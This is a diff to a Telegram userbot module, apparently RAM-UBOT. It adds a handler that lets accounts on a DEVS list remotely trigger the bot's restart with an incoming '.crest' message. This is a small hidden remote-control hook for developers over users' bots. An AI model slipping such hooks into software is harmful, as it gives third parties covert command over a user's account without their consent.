@@ -14,7 +14,7 @@ import sys
 import os
 import io
 import sys
-from userbot import ALIVE_NAME, BOTLOG, BOTLOG_CHATID, CMD_HELP, OWNER_BOT, IG_ALIVE, REPO_NAME, GROUP_LINK, bot
+from userbot import ALIVE_NAME, BOTLOG, BOTLOG_CHATID, CMD_HELP, OWNER_BOT, IG_ALIVE, REPO_NAME, GROUP_LINK, DEVS, bot
 from userbot.events import register
 from userbot.utils import time_formatter
 import urllib
@@ -75,6 +75,7 @@ async def killdabot(event):
 
 
 @register(outgoing=True, pattern="^.restart$")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.crest(?: |$)(.*)")
 async def restart_bot(event):
     await event.edit("**RAM-UBOT Berhasil di Restart**")
     if BOTLOG_CHATID:
